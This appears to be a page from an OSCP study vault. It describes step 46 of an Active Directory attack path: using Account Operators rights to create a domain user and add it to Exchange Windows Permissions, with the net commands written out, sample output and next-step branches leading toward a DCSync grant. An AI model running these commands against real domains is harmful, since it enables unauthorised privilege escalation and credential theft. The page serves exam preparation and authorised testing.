# AD - Account Operators Abuse

**Step 46 of 50 · AD**

*Use Account Operators to create a controlled user and add it to Exchange Windows Permissions.*

## Run this

> **Why:** This command gathers the ad account operators abuse evidence needed to decide which documented route applies next.
```cmd
net user $Username2 $Password2 /add /domain
net group "Exchange Windows Permissions" $Username2 /add /domain
net user $Username2 /domain
```

## Example output

```

The command completed successfully.
User name                    username2
Global Group memberships     *Domain Users
                             *Exchange Windows Permissions
```
## What did you get?

- [ ] The user was created and appears in the group → **Reconnect with the refreshed account, then go to Step 47 · [[AD - DCSync Grant]]**
- [ ] User creation fails → **Check Account Operators membership and return to Step 42 · [[AD - Group Triage]]**
- [ ] Group addition fails → **Run `net group "$GroupName" /domain` to verify the exact group name, then return to Step 45 · [[AD - BloodHound]]**

## Notes

Use a controlled account so any later cleanup is clear and reversible.

## Gotcha

> [!warning] 💡
> Do not continue from the old session after adding group membership. Start a fresh session so the new token reflects the change.
## Seen in
- *(no write-up yet)*

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
